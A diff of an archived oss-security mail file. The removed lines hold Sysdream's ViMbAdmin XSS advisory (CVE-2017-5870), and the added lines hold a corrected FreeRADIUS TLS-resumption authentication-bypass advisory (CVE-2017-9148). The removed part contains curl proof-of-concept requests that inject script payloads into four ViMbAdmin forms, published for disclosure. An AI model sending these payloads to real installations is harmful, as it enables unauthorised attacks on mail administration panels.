@@ -1,130 +1,129 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2017/05/03/8
-Message-ID: <f9bad8be-8624-09e5-a6ea-a3d56a715d39@sysdream.com>
-Date: Wed, 3 May 2017 16:03:48 +0200
-From: Sysdream Labs <labs@...dream.com>
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2017/06/06/5
+Message-ID: <alpine.LRH.2.02.1706061556390.27351@argo.troja.mff.cuni.cz>
+Date: Tue, 6 Jun 2017 23:56:42 +0200 (CEST)
+From: Pavel Kankovsky <peak@...o.troja.mff.cuni.cz>
 To: oss-security@...ts.openwall.com
-Cc: fulldisclosure@...lists.org
-Subject: [CVE-2017-5870] Multiple XSS vulnerabilities in ViMbAdmin
+Subject: CVE-2017-9148 FreeRADIUS TLS resumption authentication bypass (erratum)
 Content-Type: text/plain; charset=utf-8
 
-# [CVE-2017-5870] Multiple XSS vulnerabilities in ViMbAdmin
+Due to various unfortunate circumstances, mostly related to my own
+sloppiness and stupidity, several "alternative facts" made their way
+into the advisory published on May 29:
 
-## Product Description
+1. Reports of EOL versions being vulnerable were greatly exaggerated.
+Only versions 2.1.1 through 2.1.7 are actually vulnerable. Other versions
+allow TLS resumption and skip inner authentication but they change their
+mind and refuse access at the last moment. (I accept full responsibility
+for this fiasco and as an act of penance I have reexamined and retested
+every single FreeRADIUS release since 2.0.0.)
 
-ViMbAdmin is a web-based interface used to manage a mail server with virtual domains, mailboxes and aliases. It is an open source solution developed by Opensolutions and distributed under the GNU/GPL license version 3. The official web site can be found at www.vimbadmin.net.
+2. The attribution of the discovery to Stefan Winter was wrong. Further
+inquiry into this matter has revealed the vulnerability was reported
+"back in February" but the true identity of a person who reported it
+remains unknown. (Stefan reported a different problem with session
+resumption in early March and those two issues might have become
+conflated but that is purely my speculation.)
 
-## Details
+Enclosed below is the corrected advisory. The timeline has been extended
+to cover the complete history of the vulnerability.
 
-**CVE ID**: CVE-2017-5870
-    
-**Access Vector**: remote
-
-**Security Risk**: high
-
-**Vulnerability**: CWE-79
-
-**CVSS Base Score**: 7.2
-
-**CVSS vector**: CVSS:3.0/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H
+-----
 
 
-## Proof of Concept
+Vendor: The FreeRADIUS Project
 
-### Domain creation form
+Product: FreeRADIUS server
 
-#### Exploit
 
-The domain creation form is vulnerable to a stored XSS vulnerability, through the `domain` and `transport` variables:
+Affected Versions:
 
-```
-curl 'http://<ip>/domain/add' -H 'Cookie: VIMBADMIN3=<SESSIONID>;' --data 'domain=testdomain%22%3E%3Cscript%3Ealert%28%27xss domain%27%29%3C%2Fscript%3E&description=none&backupmx=0&active=0&active=1&max_aliases=0&max_mailboxes=0&transport=virtual%22%3E%3Cscript%3Ealert%28%27XSS virtual%27%29%3C%2Fscript%3E' --compressed ;
-```
+2.x (EOL): 2.1.1 through 2.1.7.
 
-The payload gets injected inside the `http://<ip>/domain/list` page.
+3.0.x (stable): All versions before 3.0.14.
 
-#### Vulnerable code
+3.1.x and 4.0.x (development): All versions before 2017-02-04.
 
-The vulnerable code is located in the `addAction()` method of the `<vimbadmin directory>/application/controllers/DomainController.php` file.
 
-### Mailbox creation form
+Description:
 
-#### Exploit
+The implementation of TTLS and PEAP in FreeRADIUS skips inner
+authentication when it handles a resumed TLS connection. This is
+a feature but there is a critical catch: the server must never allow
+resumption of a TLS session until its initial connection gets to the point
+where inner authentication has been finished successfully.
 
-The mailbox creation form is vulnerable to a stored XSS vulnerability, in the `name` variable:
+Unfortunately, affected versions of FreeRADIUS fail to reliably prevent
+resumption of unauthenticated sessions unless the TLS session cache is
+disabled completely and allow an attacker (e.g. a malicious supplicant) to
+elicit EAP Success without sending any valid credentials.
 
-```
-curl 'http://mailadmin.commeun.ninja/mailbox/add/did/<domain id>' -H 'Cookie: VIMBADMIN3=<SESSIONID>' --data 'local_part=test&domain=<domain id>&name=test%22%3E%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E&password=<password>&quota=0&alt_email=&cc_welcome_email='
-```
 
-The payload gets injected inside the `http://<ip>/mailbox/list` page.
+Mitigation:
 
-#### Vulnerable code
+(a) Disable TLS session caching. Set enabled = no in the cache subsection of
+eap module settings (raddb/mods-enabled/eap in the standard v3.0.x-style
+layout).
 
-The vulnerable code is located in the `addAction()` method of the `<vimbadmin directory>/application/controllers/MailboxController.php` file.
+(b) Upgrade to version 3.0.14.
 
-### Alias creation form
 
-#### Exploit
+Credits:
 
-The alias creation form is vulnerable to a stored XSS vulnerability, in the `goto` variable:
+It is not known who was the first to discover this vulnerability.
 
-```
-curl 'http://<ip>/alias/add/did/<domain id>' -H 'Cookie: VIMBADMIN3=<SESSIONID>' --data 'local_part=test&domain=4&goto%5B%5D=test%40test.com%22%3E%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E'
-```
+Luboš Pavlíček of the University of Economics, Prague independently
+rediscovered it in April 2017.
 
-The payload gets injected inside the `http://<ip>/alias` page.
 
-#### Vulnerable code
+Timeline:
 
-The vulnerable code is located in the `addAction()` method of the `<vimbadmin directory>/application/controllers/AliasController.php` file.
+2008-09-05 Version 2.1.0 released. It was the first version supporting
+TTLS session resumption/PEAP fast reauthentication.
 
-### On reset password page
+2008-09-24 Vulnerability introduced (commit c6786c12).
 
-#### Exploit
+2008-09-25 Version 2.1.1 released.
 
-A reflected XSS vulnerability has been found on the alias creation form, using variables `captchatext`.
+2009-09-14 Version 2.1.7 released.
 
-```
-curl 'http://<ip>/auth/lost-password' --data 'username=none&captchaid=<captcha id>&requestnewimage=0&captchatext=none%22%3E%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E&login=Reset+Password'
+2009-09-24 Vulnerability fixed (commit 776cf690).
 
-```
+2009-12-30 Version 2.1.8 released.
 
-The payload gets injected inside the `http://<ip>/alias` page.
+2011-05-11 Vulnerability reintroduced in v3.0.x branch (commit a3f08dcb).
 
-#### Vulnerable code
+2013-10-07 Version 3.0.0 released.
 
-The vulnerable code is located in the `_getFormLostPassword()` method of the `<vimbadmin directory>/application/controllers/AuthController.php` file.
+early February 2017: Vulnerability discovered (or rediscovered?) and
+reported by an unknown person.
 
-## Affected version
+2017-02-03: The first (and mostly ineffective) attempt to fix the
+vulnerability in v3.0.x branch (commits 5aabc3b1 and 6b909d0c).
 
-* tested on version 3.0.15
+2017-02-04 Vulnerability fixed in v3.1.x and v4.0.x branches (commits
+813a93a7 and c703ad96, respectively).
 
-## Timeline (dd/mm/yyyy)
+2017-03-06 Version 3.0.13 released without any explicit indication that it
+was supposed to fix a serious vulnerability (but it was probably better
+that way because the vulnerability was not really fixed).
 
-* 22/01/2017 : Initial discovery.
-* 16/02/2017 : First contact with opensolutions.io
-* 16/02/2017 : Advisory sent.
-* 24/02/2017 : Reply from the owner, acknowledging the report and planning to fix the vulnerabilities.
-* 13/03/2017 : Sysdream Labs request for an update.
-* 29/03/2017 : Second request for an update.
-* 29/03/2017 : Reply from the owner stating that he has no time to fix the issues.
-* 03/05/2017 : Full disclosure.
+2017-04-24 Vulnerability rediscovered by Luboš Pavlíček.
 
-## Credits
+2017-04-25 PoC exploit developed and used to confirm 3.0.13 is still
+vulnerable. Vulnerability reported... again.
 
-* Florian NIVETTE, Sysdream (f.nivette -at- sysdream -dot- com)
+2017-05-08 The second (and hopefully final) attempt to fix the
+vulnerability in v3.0.x (commits af030bd4 and 8f53382c).
+
+2017-05-26 Version 3.0.14 released.
+
+
+References:
+
+[1] <http://freeradius.org/security.html>
+[2] <http://freeradius.org/press/index.html#3.0.14>
+
 
 -- 
-SYSDREAM Labs <labs@...dream.com>
-
-GPG :
-47D1 E124 C43E F992 2A2E
-1551 8EB4 8CD9 D5B2 59A1
-
-* Website: https://sysdream.com/
-* Twitter: @sysdream
-
-
-
-Download attachment "signature.asc" of type "application/pgp-signature" (820 bytes)
+Pavel Kankovsky aka Peak                      "Que sçay-je?"
